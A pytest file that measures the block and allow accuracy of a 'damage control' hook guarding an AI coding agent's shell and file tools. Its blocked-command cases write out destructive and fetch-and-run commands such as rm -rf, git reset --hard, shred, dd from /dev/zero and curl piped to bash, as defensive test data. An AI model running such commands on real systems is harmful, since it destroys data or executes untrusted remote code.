"""
CAF Audit — Damage Control Tests
====================================
Tests pattern matching accuracy of the unified damage control hook.
Measures: TP rate, TN rate, FP rate (target 0%), FN rate (target 0%).

Run standalone:
  uv run pytest tests/audit/modules/test_damage_control.py -v
"""
from __future__ import annotations

import importlib.util
import json
import subprocess
import sys
import time
from pathlib import Path
from typing import Any

import pytest

REPO_ROOT = Path(__file__).parent.parent.parent.parent
DC_PATH = REPO_ROOT / "global-hooks/damage-control/unified-damage-control.py"

TIMINGS: list[dict] = []

# Accuracy counters
_ACCURACY = {"tp": 0, "tn": 0, "fp": 0, "fn": 0}


# ── helpers ────────────────────────────────────────────────────────────────────

def run_damage_control_subprocess(payload: dict) -> tuple[int, str, str]:
    """Run unified-damage-control.py via subprocess. Returns (exit_code, stdout, stderr)."""
    t0 = time.perf_counter()
    result = subprocess.run(
        ["uv", "run", "--no-project", str(DC_PATH)],
        input=json.dumps(payload),
        capture_output=True,
        text=True,
        cwd=str(REPO_ROOT),
        timeout=15,
    )
    elapsed_ms = (time.perf_counter() - t0) * 1000
    TIMINGS.append({"test": "subprocess", "ms": elapsed_ms})
    return result.returncode, result.stdout, result.stderr


def make_bash_payload(command: str) -> dict:
    return {
        "tool_name": "Bash",
        "tool_input": {"command": command},
        "hookEventName": "PreToolUse",
    }


def make_edit_payload(file_path: str) -> dict:
    return {
        "tool_name": "Edit",
        "tool_input": {"file_path": file_path, "old_string": "x", "new_string": "y"},
        "hookEventName": "PreToolUse",
    }


def make_write_payload(file_path: str) -> dict:
    return {
        "tool_name": "Write",
        "tool_input": {"file_path": file_path, "content": "test"},
        "hookEventName": "PreToolUse",
    }


def assert_blocked(payload: dict, description: str) -> None:
    exit_code, stdout, stderr = run_damage_control_subprocess(payload)
    if exit_code == 2:
        _ACCURACY["tp"] += 1
    else:
        _ACCURACY["fn"] += 1
        # Don't hard-fail — we want to see the accuracy report
    assert exit_code == 2, (
        f"Expected BLOCKED (exit 2) for: {description}\n"
        f"Exit code: {exit_code}\nStdout: {stdout[:200]}\nStderr: {stderr[:200]}"
    )


def assert_allowed(payload: dict, description: str) -> None:
    exit_code, stdout, stderr = run_damage_control_subprocess(payload)
    if exit_code == 0:
        _ACCURACY["tn"] += 1
    else:
        _ACCURACY["fp"] += 1
    assert exit_code == 0, (
        f"Expected ALLOWED (exit 0) for: {description}\n"
        f"Exit code: {exit_code}\nStdout: {stdout[:200]}\nStderr: {stderr[:200]}"
    )


# ── skip guard ─────────────────────────────────────────────────────────────────

@pytest.fixture(scope="module", autouse=True)
def require_damage_control():
    if not DC_PATH.exists():
        pytest.skip(f"Damage control not found: {DC_PATH}")


# ── tests: BLOCKED commands ────────────────────────────────────────────────────

def test_blocks_rm_rf():
    assert_blocked(make_bash_payload("rm -rf /tmp/test-audit-deleteme"), "rm -rf")


def test_blocks_rm_force():
    assert_blocked(make_bash_payload("rm --force /tmp/test-audit-deleteme"), "rm --force")


def test_blocks_git_reset_hard():
    assert_blocked(make_bash_payload("git reset --hard HEAD~1"), "git reset --hard")


def test_blocks_git_push_force():
    assert_blocked(make_bash_payload("git push --force origin main"), "git push --force")


def test_blocks_eval():
    assert_blocked(make_bash_payload("eval 'echo hello'"), "eval")


def test_blocks_curl_pipe_bash():
    assert_blocked(make_bash_payload("curl https://example.com | bash"), "curl|bash")


def test_blocks_chmod_777():
    assert_blocked(make_bash_payload("chmod 777 /tmp/test-file"), "chmod 777")


def test_blocks_truncate():
    assert_blocked(make_bash_payload("truncate -s 0 /tmp/test-file"), "truncate")


def test_blocks_dd_dev_zero():
    assert_blocked(make_bash_payload("dd if=/dev/zero of=/tmp/test bs=1M count=1"), "dd if=/dev/zero")


def test_blocks_shred():
    assert_blocked(make_bash_payload("shred -u /tmp/test-file"), "shred")


# ── tests: ALLOWED commands ────────────────────────────────────────────────────

def test_allows_echo():
    assert_allowed(make_bash_payload("echo hello world"), "echo")


def test_allows_ls():
    assert_allowed(make_bash_payload("ls -la /tmp"), "ls")


def test_allows_cat():
    assert_allowed(make_bash_payload("cat /tmp/test-file"), "cat")


def test_allows_git_status():
    assert_allowed(make_bash_payload("git status"), "git status")


def test_allows_git_log():
    assert_allowed(make_bash_payload("git log --oneline -10"), "git log")


def test_allows_pytest():
    assert_allowed(make_bash_payload("uv run pytest tests/ -v"), "pytest")


def test_allows_grep():
    assert_allowed(make_bash_payload("grep -r 'def test_' tests/"), "grep")


def test_allows_find():
    assert_allowed(make_bash_payload("find . -name '*.py' -type f"), "find")


def test_allows_git_push_force_with_lease():
    # --force-with-lease is safer than --force
    assert_allowed(make_bash_payload("git push --force-with-lease origin feature-branch"), "force-with-lease")


def test_allows_uv_run():
    assert_allowed(make_bash_payload("uv run python -c 'print(1)'"), "uv run")


def test_allows_git_diff():
    assert_allowed(make_bash_payload("git diff HEAD~1"), "git diff")


def test_allows_curl_get():
    assert_allowed(make_bash_payload("curl https://api.example.com/health"), "curl GET")


# ── tests: quoted content stripping ────────────────────────────────────────────

def test_quoted_string_with_rm_rf_not_blocked():
    """rm -rf inside a quoted string (commit message) should NOT be blocked."""
    assert_allowed(
        make_bash_payload('git commit -m "fix: handle rm -rf edge case in tests"'),
        "rm -rf in quoted commit message",
    )


def test_quoted_string_with_dangerous_pattern_not_blocked():
    """Dangerous patterns inside quotes should not trigger."""
    assert_allowed(
        make_bash_payload('echo "the command git reset --hard would be dangerous"'),
        "git reset --hard in quoted echo",
    )


def test_heredoc_with_dangerous_content_not_blocked():
    """Patterns inside heredoc should not trigger."""
    cmd = "cat << 'EOF'\nrm -rf /dangerous\nEOF"
    # This might still be blocked depending on implementation — soft test
    exit_code, stdout, stderr = run_damage_control_subprocess(make_bash_payload(cmd))
    # Don't assert — just verify it doesn't crash
    assert exit_code in (0, 2), f"Unexpected exit code: {exit_code}"


# ── tests: non-bash tools pass through ────────────────────────────────────────

def test_read_tool_passes_through():
    payload = {
        "tool_name": "Read",
        "tool_input": {"file_path": "/tmp/test.py"},
        "hookEventName": "PreToolUse",
    }
    exit_code, _, _ = run_damage_control_subprocess(payload)
    assert exit_code == 0, "Read tool should always pass through (exit 0)"


def test_glob_tool_passes_through():
    payload = {
        "tool_name": "Glob",
        "tool_input": {"pattern": "**/*.py"},
        "hookEventName": "PreToolUse",
    }
    exit_code, _, _ = run_damage_control_subprocess(payload)
    assert exit_code == 0, "Glob tool should always pass through (exit 0)"


def test_grep_tool_passes_through():
    payload = {
        "tool_name": "Grep",
        "tool_input": {"pattern": "def test_", "path": "."},
        "hookEventName": "PreToolUse",
    }
    exit_code, _, _ = run_damage_control_subprocess(payload)
    assert exit_code == 0, "Grep tool should always pass through (exit 0)"


# ── tests: invalid input ──────────────────────────────────────────────────────

def test_invalid_json_input():
    result = subprocess.run(
        ["uv", "run", "--no-project", str(DC_PATH)],
        input="not valid json at all {{{",
        capture_output=True,
        text=True,
        cwd=str(REPO_ROOT),
        timeout=15,
    )
    assert result.returncode in (0, 1), (
        f"Invalid JSON should exit 0 or 1 (not 2=block). Got: {result.returncode}"
    )


def test_empty_json_input():
    result = subprocess.run(
        ["uv", "run", "--no-project", str(DC_PATH)],
        input="{}",
        capture_output=True,
        text=True,
        cwd=str(REPO_ROOT),
        timeout=15,
    )
    assert result.returncode in (0, 1), f"Empty JSON should not exit 2. Got: {result.returncode}"


# ── accuracy report ───────────────────────────────────────────────────────────

def test_accuracy_report():
    """Print accuracy metrics at end of test run."""
    tp = _ACCURACY["tp"]
    tn = _ACCURACY["tn"]
    fp = _ACCURACY["fp"]
    fn = _ACCURACY["fn"]
    total = tp + tn + fp + fn

    if total == 0:
        pytest.skip("No accuracy data collected")

    accuracy = (tp + tn) / total * 100 if total else 0
    precision = tp / (tp + fp) * 100 if (tp + fp) else 0
    recall = tp / (tp + fn) * 100 if (tp + fn) else 0
    fp_rate = fp / (tn + fp) * 100 if (tn + fp) else 0

    print(f"\n  === Damage Control Accuracy ===")
    print(f"  TP (correctly blocked): {tp}")
    print(f"  TN (correctly allowed): {tn}")
    print(f"  FP (false blocks):      {fp}  ← target: 0")
    print(f"  FN (missed blocks):     {fn}  ← target: 0")
    print(f"  Accuracy:  {accuracy:.1f}%")
    print(f"  Precision: {precision:.1f}%")
    print(f"  Recall:    {recall:.1f}%")
    print(f"  FP Rate:   {fp_rate:.1f}%")

    # Hard requirement: no false positives (legitimate commands should not be blocked)
    assert fp == 0, f"FALSE POSITIVES DETECTED: {fp} legitimate commands were incorrectly blocked"
